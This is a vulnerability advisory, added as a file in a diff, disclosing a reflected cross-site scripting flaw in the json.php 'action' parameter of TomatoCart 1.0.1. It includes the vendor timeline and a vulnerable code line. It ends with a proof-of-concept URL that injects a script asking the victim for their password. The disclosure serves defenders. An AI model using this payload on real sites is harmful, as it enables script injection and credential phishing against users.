@@ -1,0 +1,67 @@
+
+TomatoCart 1.0.1 (json.php) Remote Cross-Site Scripting Vulnerability
+
+
+Vendor: Wuxi Elootec Technology Co., Ltd.
+Product web page: http://www.tomatocart.com
+Affected version: 1.0.1
+
+
+Summary: TomatoCart is the new generation of open source shopping cart
+         solution developed by Elootec Technology Co., Ltd. It is branched
+         from osCommerce 3 as a separate project.
+
+
+Desc: TomatoCart version 1.0.1 suffers from a XSS vulnerability because
+      input passed via the "action" parameter to json.php script is not
+      properly sanitised before being returned to the user. This can be
+      exploited to execute arbitrary HTML and script code in a user's
+      browser session in context of an affected site.
+
+
+-------------------------------- .output --------------------------------
+
+ Warning: call_user_func() expects parameter 1 to be a valid callback,
+ class 'toC_Json_Checkout' does not have a method '1' in \tomatocart\includes\classes\json.php on line 64
+
+ Line 64: call_user_func(array('toC_Json_' . ucfirst($module), $action));
+
+-------------------------------- output. --------------------------------
+
+
+ --
+
+
+------------------- .snip -------------------
+
+ $action = $_REQUEST['action'];
+
+------------------- snip. -------------------
+
+
+
+Tested on: Microsoft Windows XP Professional SP3 (English)
+           Apache 2.2.14 (Win32)
+           MySQL 5.1.41
+           PHP 5.3.1
+
+
+Vendor status: [01.10.2010] Vulnerability discovered.
+               [02.10.2010] Vendor contacted.
+               [05.10.2010] No reply from vendor.
+               [06.10.2010] Public advisory released.
+
+
+Advisory ID: ZSL-2010-4968
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4968.php
+
+
+Vulnerability discovered by: Gjoko "LiquidWorm" Krstic
+                             liquidworm gmail com
+                             Zero Science Lab - http://www.zeroscience.mk
+
+
+
+Dokaz na koncept:
+
+ http://tomatocart/json.php?action=1<script>prompt("Please enter your password:")</script>&module=checkout&sid=31337133713371337133731337
